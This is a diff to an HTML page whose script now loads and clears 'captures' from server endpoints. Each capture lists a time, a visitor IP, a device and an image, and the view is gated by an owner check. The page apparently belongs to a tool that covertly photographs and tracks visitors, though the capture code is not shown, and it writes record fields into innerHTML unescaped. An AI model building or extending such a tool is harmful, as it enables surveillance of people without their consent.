@@ -27,10 +27,8 @@
 
   <!-- Logs -->
   <div id="logs" class="hidden mt-10 w-3/4 max-w-lg">
-    <div class="flex justify-between items-center mb-4">
-      <h2 class="text-xl font-bold">📂 Capture History</h2>
-      <button onclick="clearLogs()" class="bg-red-500 px-3 py-1 rounded hover:bg-red-600">Clear</button>
-    </div>
+    <h2 class="text-xl font-bold mb-4">📂 Capture History</h2>
+    <button onclick="clearLogs()" class="bg-red-500 px-3 py-1 rounded mb-4 hover:bg-red-600">Clear All</button>
     <div id="logContainer"></div>
   </div>
 
@@ -52,32 +50,36 @@ function checkOwner() {
 }
 
 function loadLogs() {
-  const container = document.getElementById("logContainer");
-  container.innerHTML = "";
+  fetch("/get-captures")
+    .then(res => res.json())
+    .then(logs => {
+      const container = document.getElementById("logContainer");
+      container.innerHTML = "";
 
-  const logs = JSON.parse(localStorage.getItem("captures") || "[]");
+      if (logs.length === 0) {
+        container.innerHTML = "<p>No captures yet.</p>";
+        return;
+      }
 
-  if (logs.length === 0) {
-    container.innerHTML = "<p>No captures yet.</p>";
-    return;
-  }
-
-  logs.forEach(log => {
-    const div = document.createElement("div");
-    div.className = "bg-gray-800 p-3 rounded mb-3 shadow";
-    div.innerHTML = `
-      🕒 ${log.time} <br>
-      🌍 IP: ${log.ip} <br>
-      📱 Device: ${log.device} <br>
-      <img src="${log.img}" width="200" class="mt-2 rounded">
-    `;
-    container.appendChild(div);
-  });
+      logs.forEach(log => {
+        const div = document.createElement("div");
+        div.className = "bg-gray-800 p-3 rounded mb-3 shadow";
+        div.innerHTML = `
+          🕒 ${log.time} <br>
+          🌍 IP: ${log.ip} <br>
+          📱 Device: ${log.device} <br>
+          <img src="${log.img}" width="200" class="mt-2 rounded">
+        `;
+        container.appendChild(div);
+      });
+    });
 }
 
 function clearLogs() {
-  localStorage.removeItem("captures");
-  loadLogs();
+  fetch("/clear-captures", { method: "POST" })
+    .then(() => {
+      document.getElementById("logContainer").innerHTML = "<p>All captures cleared.</p>";
+    });
 }
 </script>
 </body>
